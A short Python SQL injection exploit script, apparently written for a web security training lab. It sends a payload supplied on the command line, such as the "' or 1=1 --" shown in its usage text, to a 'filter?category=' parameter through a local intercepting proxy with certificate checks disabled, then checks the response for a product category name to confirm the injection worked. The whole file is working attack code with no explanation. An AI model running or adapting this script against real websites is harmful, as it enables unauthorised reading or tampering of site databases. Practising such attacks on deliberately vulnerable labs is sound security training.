import requests
import urllib3
import sys

urllib3.disable_warnings(urllib3.exceptions.InsecureRequestWarning)

proxy = {'http' : 'http://127.0.0.1:8080', 'https' : 'http://127.0.0.1:8080'}

def exploit(url, payload):

    res = requests.get(url + 'filter?category=' + payload, verify=False, proxies=proxy)

    if 'Fur Babies' in res.text:
        print('(+) Sqli payload executed successfully!')
    else:
        print("(-) Unable to execute this payload, try another one!")

def main():
    if len(sys.argv) != 3:
        print("(+) Usage: %s <URL> <SQLi_Payload>" % sys.argv[0]);
        print("(+) Example: %s http://www.example.com/ \"' or 1=1 --\"" % sys.argv[0]);
        sys.exit(-1)

    url = sys.argv[1]
    payload = sys.argv[2]

    exploit(url, payload)

if __name__ == "__main__":
    main();
